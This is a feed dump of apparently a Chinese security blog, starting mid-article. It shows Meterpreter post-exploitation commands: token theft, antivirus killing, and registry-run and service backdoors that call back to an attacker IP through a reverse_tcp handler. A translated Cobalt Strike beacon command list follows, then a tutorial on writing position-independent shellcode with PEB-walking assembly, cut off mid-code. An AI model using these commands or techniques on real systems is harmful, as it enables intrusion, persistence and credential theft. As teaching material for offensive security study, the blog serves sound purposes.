执行</span></span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   <span class="comment">#返回原始token</span></span><br></pre></td></tr></table></figure><p>可以看到我们直接使用<strong>SYSTEM</strong>权限运行了<code>shell</code></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/14.png?raw=true" alt="image-20200525174444421"></p><h5 id="steal-token窃取令牌"><a href="#steal-token窃取令牌" class="headerlink" title="steal_token窃取令牌"></a>steal_token窃取令牌</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token</span><br><span class="line">Usage: steal_token [pid]</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   <span class="comment">#从指定进程中窃取token   先ps</span></span><br><span class="line">drop_token  <span class="comment">#删除窃取的token</span></span><br></pre></td></tr></table></figure><p>这种方法如果不是SYSTEM权限的话是无法窃取SYSTEM权限的，只能窃取相关的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token 10340</span><br><span class="line">Stolen token with username: DESKTOP-S5P5JJD\ascotbe</span><br><span class="line">meterpreter &gt; steal_token 692</span><br><span class="line">[-] stdapi_sys_config_steal_token: Operation failed: Access is denied.</span><br></pre></td></tr></table></figure><h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run killav &#x2F;&#x2F;这个脚本要小心使用，可能导致目标机器蓝屏死机</span><br></pre></td></tr></table></figure><h4 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h4><h5 id="persistence启动项后门"><a href="#persistence启动项后门" class="headerlink" title="persistence启动项后门"></a>persistence启动项后门</h5><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>目录下，上传一个<strong>vbs</strong>脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  <span class="comment">#查看帮助</span></span><br><span class="line">run persistence -X -i 5 -p 6661 -r 192.168.159.134</span><br><span class="line"><span class="comment">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span></span><br></pre></td></tr></table></figure><p><strong>连接后门</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> LHOST 192.168.159.134</span><br><span class="line">msf &gt; <span class="built_in">set</span> LPORT 6661</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><h4 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h4><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>上传了三个文件（<strong>metsrv.x86.dll</strong>、<strong>metsvc-server.exe</strong>、<strong>metsvc.exe</strong>），通过服务启动，服务名为<strong>meterpreter</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   <span class="comment"># 查看帮助</span></span><br><span class="line">run metsvc –A   <span class="comment">#自动安装后门</span></span><br></pre></td></tr></table></figure><p><strong>连接后门</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/metsvc_bind_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> RHOST 192.168.159.144</span><br><span class="line">msf &gt; <span class="built_in">set</span> LPORT 31337</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><h4 id="Cobalt-Strike体系框架"><a href="#Cobalt-Strike体系框架" class="headerlink" title="Cobalt Strike体系框架"></a>Cobalt Strike体系框架</h4><h5 id="beacon命令"><a href="#beacon命令" class="headerlink" title="beacon命令"></a>beacon命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">BeaconCommands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    cd                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   Connect to a Beacon peerover TCP</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程VNC</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   尝试提权</span><br><span class="line">   execute                   在目标上执行程序(无输出)</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    exit                      退出beacon</span><br><span class="line">    getprivs                  Enable system privileges oncurrent token</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    help                      帮助</span><br><span class="line">    inject                    在特定进程中生成会话</span><br><span class="line">    jobkill                   杀死一个后台任务</span><br><span class="line">    jobs                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    kill                      结束进程</span><br><span class="line">    link                      Connect to a Beacon peerover a named pipe</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    mkdir                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      备注      </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      Set parent PID forspawned post-ex jobs</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    Use a service to spawn asession on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn asession on a host</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    pwd                       当前目录位置</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以另一个用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      Execute a program underanother PID</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     cmd执行命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     Spawn a session</span><br><span class="line">    spawnas                   Spawn a session as anotheruser</span><br><span class="line">    spawnto                  Set executable tospawn processes into</span><br><span class="line">    spawnu                    Spawn a session underanother PID</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class="line">    unlink                    Disconnect from parentBeacon</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM在主机上生成会话</span><br><span class="line">    wmi                       使用WMI在主机上生成会话</span><br><span class="line">    argue                      进程参数欺骗</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2536</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意程序研究之定义ShellCode</title>
    <link href="https://www.ascotbe.com/2020/04/18/ShellCode/"/>
    <id>https://www.ascotbe.com/2020/04/18/ShellCode/</id>
    <published>2020-04-18T15:07:46.000Z</published>
    <updated>2021-05-04T06:03:28.416Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于写完了，应该挺详细的，奥利给</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/29.gif?raw=true" alt="img"></p><h2 id="环境配置讲解"><a href="#环境配置讲解" class="headerlink" title="环境配置讲解"></a>环境配置讲解</h2><p>当前项目使用的vs2019，其他vs编译器都可以</p><h4 id="清除多余的函数"><a href="#清除多余的函数" class="headerlink" title="清除多余的函数"></a>清除多余的函数</h4><p>首先创建一个项目，然后什么配置都不修改使用<code>release</code>生成如下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们把生成的exe文件放到ida里面去可以看到下图，明明我们什么函数都没有加为什么会多出这么多函数呢？</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/30.png?raw=true" alt="image-20200418151303938"></p><p>其实这些函数都是vs编译器自动帮我加进去的，我们的代码段加上这些函数就组成了一个PE文件</p><p>位置：项目-&gt;配置属性-&gt;高级-&gt;入口点中添加<code>MyMian</code>字段，这个字段可以随意修改</p><p>接着我们把原先的代码替换为如下代码，然后重新生成</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/31.png?raw=true" alt="image-20200418152511957"></p><p>可以看到多余的函数都不见了</p><h4 id="禁用安全检查"><a href="#禁用安全检查" class="headerlink" title="禁用安全检查"></a>禁用安全检查</h4><p>上面是不是还有一个多余函数，该函数是用于安全检查用的，我们一样可以关闭它。</p><p>位置：项目-&gt;配置属性-&gt;<code>C/C++</code>-&gt;代码生成-&gt;安全检查，点击禁用安全检查</p><p>然后重新生成后就能看到只剩下一个字段了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/32.png?raw=true" alt="image-20200418153257417"></p><h4 id="设置兼容XP系统"><a href="#设置兼容XP系统" class="headerlink" title="设置兼容XP系统"></a>设置兼容XP系统</h4><p>虽然<strong>win7</strong>都淘汰了但是还是有不少<code>哔哔哔哔</code>(自带消音)还用着<strong>windwos XP</strong>，但是<strong>v142</strong>已经不支持<strong>xp</strong>编程了，所以我们只能下载<strong>v141_xp</strong>来使用</p><p>位置：项目-&gt;配置属性-&gt;常规-&gt;平台工作集，选用<code>Visual Studio 2017 - Windows XP (v141_xp)</code>（需要自己下载该项目包</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/33.png?raw=true" alt="image-20200418153951398"></p><p>接着修改运行库</p><p>位置：项目-&gt;配置属性-&gt;<code>C/C++</code>-&gt;代码生成-&gt;运行库，改成<strong>MT</strong>格式</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/34.png?raw=true" alt="image-20200418154222811"></p><h4 id="关闭资源段"><a href="#关闭资源段" class="headerlink" title="关闭资源段"></a>关闭资源段</h4><p>当我们把以上调试好的exe文件放入到PEiD中的时候可以看到还多出了资源段和只读数据段</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/35.png?raw=true" alt="image-20200418154752381"></p><p>位置：项目-&gt;配置属性-&gt;链接器-&gt;清单文件-&gt;生成清单，改成<strong>否</strong></p><p>重新生成后的文件放入PEiD中可以看到资源段已经消失了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/36.png?raw=true" alt="image-20200418155111496"></p><h4 id="关闭只读数据段"><a href="#关闭只读数据段" class="headerlink" title="关闭只读数据段"></a>关闭只读数据段</h4><p>位置：项目-&gt;配置属性-&gt;链接器-&gt;调试-&gt;生成调试信息，改为<strong>否</strong></p><p>注意：</p><ul><li>vs2019关闭了也没办法删除只读数据段</li><li>vs2008可以删除</li><li>不删除该字段影响不大</li></ul><h4 id="关闭优化"><a href="#关闭优化" class="headerlink" title="关闭优化"></a>关闭优化</h4><p>vs编译器会自动把没用用到的参数优化了，所以我们要关闭优化，会更直观。</p><p>位置：项目-&gt;配置属性-&gt;<code>C/C++</code>-&gt;优化，修改为<strong>已禁用</strong></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>项目-&gt;配置属性-&gt;链接器-&gt;高级-&gt;入口点中添加<code>MyMian</code>字段</li><li>项目-&gt;配置属性-&gt;<code>C/C++</code>-&gt;代码生成-&gt;安全检查，点击禁用安全检查</li><li>项目-&gt;配置属性-&gt;常规-&gt;平台工作集，选用<code>Visual Studio 2017 - Windows XP (v141_xp)</code></li><li>项目-&gt;配置属性-&gt;链接器-&gt;清单文件-&gt;生成清单，改成<strong>否</strong></li><li>项目-&gt;配置属性-&gt;链接器-&gt;调试-&gt;生成调试信息，改为<strong>否</strong></li><li>项目-&gt;配置属性-&gt;<code>C/C++</code>-&gt;优化，修改为<strong>已禁用</strong></li><li>项目-&gt;配置属性-&gt;<code>C/C++</code>-&gt;代码生成-&gt;运行库，改成<strong>MT</strong>格式</li><li>项目-&gt;配置属性-&gt;<code>C/C++</code>-&gt;语言-&gt;符合模式，改成<strong>否</strong>格式</li></ul><h2 id="代码中的注意事项"><a href="#代码中的注意事项" class="headerlink" title="代码中的注意事项"></a>代码中的注意事项</h2><h4 id="杜绝双引号"><a href="#杜绝双引号" class="headerlink" title="杜绝双引号"></a>杜绝双引号</h4><p>vs开放平台中，双引号字符串会被编译到只读数据段，以引用绝对地址的方式使用，<code>shellcode</code>是为了便于所有机器上使用的，所有要<strong>避免一切绝对地址的使用</strong>，下面的函数调用会报错，之所以这样写是为了直观理解，实际需要用动态调用。</p><ul><li><p>禁止使用的格式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.字符串和指针形式</span></span><br><span class="line"><span class="keyword">char</span> szBuff[]=<span class="string">&quot;XXXXXXXXXX&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *pzBuff=<span class="string">&quot;XXXXXXXXXX&quot;</span>;</span><br><span class="line"><span class="comment">//2.函数中的引用</span></span><br><span class="line"><span class="keyword">char</span> szDate[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> *pzBuff=<span class="string">&quot;XXXXX&quot;</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(szDate,<span class="string">&quot;%s&quot;</span>,pzBuff);</span><br><span class="line"><span class="built_in">memcpy</span>(szDate,<span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>应该写成的格式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.字符串的形式</span></span><br><span class="line"><span class="keyword">char</span> szBuff[]=&#123;<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"><span class="comment">//2.汇编的形式</span></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">_EMIT <span class="string">&#x27;X&#x27;</span></span><br><span class="line">_EMIT <span class="string">&#x27;X&#x27;</span></span><br><span class="line">_EMIT <span class="string">&#x27;X&#x27;</span></span><br><span class="line">_EMIT <span class="string">&#x27;X&#x27;</span></span><br><span class="line">_EMIT <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3.函数的形式</span></span><br><span class="line"><span class="keyword">char</span> szDate[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> szBuff[]=&#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> szOut[]=&#123;<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *pzBuff=<span class="string">&quot;XXXXX&quot;</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(szDate,szBuff);</span><br><span class="line"><span class="built_in">sprintf</span>(szDate,szOut,pzBuff);</span><br></pre></td></tr></table></figure></li></ul><h4 id="函数动态调用"><a href="#函数动态调用" class="headerlink" title="函数动态调用"></a>函数动态调用</h4><p>如果不是用该方法，在我们修改了main函数的入口后，调用include中的函数就好花式报错，但是你自己写的函数就不会</p><p>先贴一个调用<strong>Windows API</strong>中<code>CreateFileA</code>函数的例子，后面再详细讲解</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:MyMain&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* FN_CreateFileA)</span><span class="params">(<span class="comment">//在windows.h源文件中找到CreateFileA的定义然后拷贝过来，接着用typedef定义一个高仿的</span></span></span></span><br><span class="line"><span class="function"><span class="params">            __in     LPCSTR lpFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">            __in     DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">            __in     DWORD dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">            __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">            __in     DWORD dwCreationDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">            __in     DWORD dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">            __in_opt HANDLE hTemplateFile</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line">    FN_CreateFileA fn_CreateFileA;<span class="comment">//声明定义好的类</span></span><br><span class="line">    fn_CreateFileA = (FN_CreateFileA)GetProcAddress(LoadLibraryA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;CreateFileA&quot;</span>);<span class="comment">//把获取到的地址复制给声明的类中</span></span><br><span class="line">    fn_CreateFileA(<span class="string">&quot;ascotbe.txt&quot;</span>, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);<span class="comment">//接着就用直接使用它了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先如果使用自定义的函数入口点需要添加<code>#pragma comment(linker,&quot;/entry:MyMain&quot;)</code>，<strong>MyMain</strong>的值为你的入口函数名</p><p>接着我们需要获取DLL中函数的地址，使用<code>GetProcAddress(LoadLibraryA(&quot;kernel32.dll&quot;), &quot;CreateFileA&quot;);</code>这段代码的意思就是获取<strong>kernel32.dll</strong>动态链接库中的<strong>CreateFileA</strong>函数的相对地址。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/37.png?raw=true" alt="image-20200418204345026"></p><p>然后找到<strong>CreateFileA</strong>函数的声明，然后复制过来</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/38.png?raw=true" alt="image-20200418204703230"></p><p>接着就是使用<strong>typedef</strong>定义复制过来的函数，以及声明调用等</p><p>如果使用<strong>printf</strong>函数也是一样的，代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:MyMain&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(__CRTDECL* FN_printf)</span><span class="params">(_In_z_ _Printf_format_string_ <span class="keyword">char</span> <span class="keyword">const</span>* <span class="keyword">const</span> _Format, ...)</span></span>;</span><br><span class="line">    FN_printf Fn_printf;</span><br><span class="line">    Fn_printf = (FN_printf)GetProcAddress(LoadLibraryA(<span class="string">&quot;msvcrt.dll&quot;</span>), <span class="string">&quot;printf&quot;</span>);</span><br><span class="line">    Fn_printf(<span class="string">&quot;asoctbe is a vegetable~&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数动态调用优化"><a href="#函数动态调用优化" class="headerlink" title="函数动态调用优化"></a>函数动态调用优化</h4><p>由上文可以知道我们需要动态调用函数或者API，但是有两个地方违背了我们核心的原理。</p><ul><li>动态调用的前提我们需要获取<strong>kernel32.dll</strong>的基址，这个地方还是需要用到API中的<strong>LoadLibraryA</strong>函数！</li><li>即使获取到<strong>kernel32.dll</strong>的基址我们还是需要用<strong>GetProcAddress</strong>函数来提取里面的函数！</li></ul><p>首先我们解决第一个痛点：</p><h5 id="获取kernel32-dll基址"><a href="#获取kernel32-dll基址" class="headerlink" title="获取kernel32.dll基址"></a>获取kernel32.dll基址</h5><p>先贴代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:MyMain&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">__declspec(naked)<span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        XCHG EAX, EBX</span><br><span class="line">        MOV EBX, FS:[<span class="number">30</span>H] <span class="comment">//从TIB(Thread Information Block)中取得PEB(Process Environment Block)的地址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">0</span>CH] <span class="comment">//从PEB中取得LDR类的基址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">14</span>H] <span 